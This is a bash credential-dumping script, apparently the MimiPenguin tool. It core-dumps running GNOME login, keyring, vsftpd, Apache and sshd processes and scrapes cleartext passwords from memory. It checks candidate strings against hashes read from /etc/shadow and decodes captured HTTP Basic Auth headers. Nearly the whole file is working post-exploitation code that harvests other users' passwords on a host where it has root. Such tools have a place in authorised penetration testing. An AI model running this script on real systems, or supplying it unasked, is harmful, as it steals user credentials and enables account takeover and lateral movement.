#!/bin/bash

# Author: Hunter Gregal
# Github: /huntergregal Twitter: /huntergregal Site: huntergregal.com
# Contribution from pugilist - PID extraction method 
# Dumps cleartext credentials from memory

#root check
if [[ "$EUID" -ne 0 ]]; then
	echo "Root required - You are dumping memory..."
	echo "Even mimikatz requires administrator"
	exit 1
fi

#Store results to cleanup later
export RESULTS=""

parse_pass ()
{
#$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE

#If hash not in dump get shadow hashes
if [[ ! "$2" ]]; then
		SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | egrep '^\$.\$')"
fi

#Determine password potential for each word
while read -r line; do
	#If hash in dump, prepare crypt line
	if [[ "$2" ]]; then
		#get ctype
		CTYPE="$(echo "$2" | cut -c-3)"
		#Escape quotes, backslashes, single quotes to pass into crypt
		SAFE=$(echo "$line" | sed 's/\\/\\\\/; s/\"/\\"/; s/'"'"'/\\'"'"'/;')
		CRYPT="\"$SAFE\", \"$CTYPE$3\""
		if [[ $(python -c "import crypt; print crypt.crypt($CRYPT)") == "$2" ]]; then
			#Find which user's password it is (useful if used more than once!)
			USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
			export RESULTS="$RESULTS$4			$USER:$line \n"
		fi
	#Else use shadow hashes
	elif [[ $SHADOWHASHES ]]; then
		while read -r thishash; do
			CTYPE="$(echo "$thishash" | cut -c-3)"
			SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
			#Escape quotes, backslashes, single quotes to pass into crypt
			SAFE=$(echo "$line" | sed 's/\\/\\\\/; s/\"/\\"/; s/'"'"'/\\'"'"'/;')
			CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
			if [[ $(python -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
				#Find which user's password it is (useful if used more than once!)
				USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
				export RESULTS="$RESULTS$4			$USER:$line\n"
			fi
		done <<< "$SHADOWHASHES"
	#if no hash data - revert to checking probability
	else
		if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ ^LOGNAME= ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ UTF-8 ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ ^splayManager[0-9]$ ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ ^gkr_system_authtok$ ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ Manager\.Worker ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ /usr/share ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ /bin ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ \.so\.[0-1]$ ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ x86_64 ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ (aoao) ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ stuv ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		else
			export RESULTS="$RESULTS[HIGH]$4			$line\n"
		fi
	fi
done <<< "$1"
}

#Support Kali
if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
	SOURCE="[SYSTEM - GNOME]"
	#get gdm-session-worker [pam/gdm-password] process
	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump "$PID" >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo "$HASH" | cut -d'$' -f 3)"
	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
	DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
	#Remove dupes to speed up processing
	DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
	
	#cleanup
	rm -rf "/tmp/dump.${PID}"
fi

#Support Ubuntu
if [[ $(uname -a | awk '{print tolower($0)}') == *"ubuntu"* ]]; then
		SOURCE="[SYSTEM - GNOME]"
		#get /usr/bin/gnome-keyring-daemon process
		PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	#if exists aka someone logged into gnome then extract...
	if [[ $PID ]];then
		while read -r pid; do
			gcore -o /tmp/dump "$pid" >& /dev/null
			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
			DUMP=$(strings "/tmp/dump.${pid}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
			DUMP+=$(strings "/tmp/dump.${pid}" | egrep -A 5 -B 5 'libgcrypt\.so\..+$')
			#Remove dupes to speed up processing
			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
			#cleanup
			rm -rf "/tmp/dump.${pid}"
		done <<< "$PID"
	fi
fi

#Support VSFTPd - Active Users
if [[ -e "/etc/vsftpd.conf" ]]; then
		SOURCE="[SYSTEM - VSFTPD]"
		#get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
		PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk 'BEGIN {FS = " " } ; { print $1 }')"
	#if exists aka someone logged into FTP then extract...
	if [[ $PID ]];then
		while read -r pid; do
				gcore -o /tmp/vsftpd "$PID" >& /dev/null
				HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
				SALT="$(echo "$HASH" | cut -d'$' -f 3)"
				DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
			#Remove dupes to speed up processing
			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
		done <<< "$PID"

		#cleanup
		rm -rf /tmp/vsftpd*
	fi
fi

#Support Apache2 - HTTP BASIC AUTH
if [[ -e "/etc/apache2/apache2.conf" ]]; then
		SOURCE="[HTTP BASIC - APACHE2]"
		#get all apache workers /usr/sbin/apache2 -k start
		PID="$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk 'BEGIN {FS = " " } ; { print "$1" }')"
	#if exists aka apache2 running
	if [[ "$PID" ]];then
		#Dump all workers
		while read -r pid; do
			gcore -o /tmp/apache "${pid}"  >& /dev/null
		done <<< "$PID"
		#Get encoded creds
		DUMP="$(strings /tmp/apache* | egrep '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
		#for each extracted b64 - decode the cleartext
		while read -r encoded; do
			CREDS="$(echo "$encoded" | base64 -d)"
			if [[ "$CREDS" ]]; then
				export RESULTS="$RESULTS$SOURCE			$CREDS\n"
			fi
		done <<< "$DUMP"
		#cleanup
		rm -rf /tmp/apache*
	fi
fi

#Support sshd - Search active connections for Sudo passwords
if [[ -e "/etc/ssh/sshd_config" ]]; then
	SOURCE="[SYSTEM - SSH]"
	#get all ssh tty/pts sessions - sshd: user@pts01
	PID="$(ps -eo pid,command | egrep 'sshd:.+@' | grep -v 'grep' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	#if exists aka someone logged into SSH then dump
	if [[ "$PID" ]];then
		while read -r pid; do
			gcore -o /tmp/sshd "$PID" >& /dev/null
			HASH="$(strings "/tmp/sshd.${pid}" | egrep -m 1 '^\$.\$.+$')"
			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
			DUMP=$(strings "/tmp/sshd.${pid}" | egrep -A 3 '^sudo.+')
			#Remove dupes to speed up processing
			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
		done <<< "$PID"
		#cleanup
		rm -rf /tmp/sshd.*
	fi
fi
#Output results to STDOUT
printf "MimiPenguin Results:\n"
printf "%s" "$RESULTS" | sort -u
unset RESULTS
